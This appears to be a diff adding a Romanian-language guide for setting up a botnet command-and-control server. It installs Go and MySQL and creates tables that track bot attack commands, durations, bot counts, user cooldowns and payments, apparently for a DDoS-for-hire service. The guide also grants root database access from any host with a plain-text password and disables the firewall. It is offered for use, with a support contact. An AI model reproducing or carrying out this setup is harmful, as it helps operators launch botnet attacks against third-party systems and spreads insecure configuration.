@@ -1,0 +1,115 @@
+1. Bagati comenzile astea pe vps
+yum update -y
+yum install epel-release -y
+yum groupinstall "Development Tools" -y
+yum install gmp-devel -y
+ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
+yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y
+(nu ne trebuie toate dar e ok)
+
+2. Bagati si astea
+cd /tmp
+wget https://dl.google.com/go/go1.13.linux-amd64.tar.gz -q
+tar -xzf go1.13.linux-amd64.tar.gz
+mv go /usr/local
+export GOROOT=/usr/local/go
+export GOPATH=$HOME/Projects/Proj1
+export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+go version
+go env
+cd ~/
+
+3. Baza de date
+service mysqld start
+mysql_secure_installation (puneti o parola si apasati enter de 4 ori)
+mysql -u root -p (enter si dupa bagati parola)
+
+Schimbati username si parola de la randu 68 si bagati asta:
+
+use mysql
+GRANT ALL ON *.* to root@'%' IDENTIFIED BY 'mamatata44';
+FLUSH PRIVILEGES;
+
+CREATE DATABASE lol;
+use lol;
+CREATE TABLE `history` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` int(10) unsigned NOT NULL,
+  `time_sent` int(10) unsigned NOT NULL,
+  `duration` int(10) unsigned NOT NULL,
+  `command` text NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  PRIMARY KEY (`id`),
+  KEY `user_id` (`user_id`)
+);
+ 
+CREATE TABLE `users` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `username` varchar(32) NOT NULL,
+  `password` varchar(32) NOT NULL,
+  `duration_limit` int(10) unsigned DEFAULT NULL,
+  `cooldown` int(10) unsigned NOT NULL,
+  `wrc` int(10) unsigned DEFAULT NULL,
+  `last_paid` int(10) unsigned NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  `admin` int(10) unsigned DEFAULT '0',
+  `intvl` int(10) unsigned DEFAULT '30',
+  `api_key` text,
+  PRIMARY KEY (`id`),
+  KEY `username` (`username`)
+);
+ 
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+INSERT INTO users VALUES (NULL, 'username', 'parola', 0, 0, 0, 0, -1, 1, 30, '');
+
+CREATE TABLE `logins` (
+  `id` int(11) NOT NULL,
+  `username` varchar(32) NOT NULL,
+  `action` varchar(32) NOT NULL,
+  `ip` varchar(15) NOT NULL,
+  `timestamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
+exit;
+
+4. Mergeti in main.go si schimbati ip:port la linia 19(ipul de la vps : portul pe care va veti conecta)
+   Mergeti in main.go si schimbati parola de la db (linia 12) cu cea pe care ati pus-o.
+
+5. Restart la db
+service iptables stop 
+service httpd restart  
+service mysqld restart
+
+6. Dam compile la cnc
+go build -o cnc/cnc cnc/*.go
+
+7.Screen la cnc
+cd cnc
+screen ./cnc
+
+Daca sunt probleme: petronel69#6969
+
+DACA DATI UPDATE LA CNC:
+BAGATI ASTEA SI APASATI ENTER:
+cd /tmp
+wget https://dl.google.com/go/go1.13.linux-amd64.tar.gz -q
+tar -xzf go1.13.linux-amd64.tar.gz
+mv go /usr/local
+
+bagati astea:
+export GOROOT=/usr/local/go
+export GOPATH=$HOME/Projects/Proj1
+export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+go version
+go env
+cd ~/
+
+apoi astea:
+go build -o loader/cnc cnc/*.go
+cd loader
+screen ./cnc
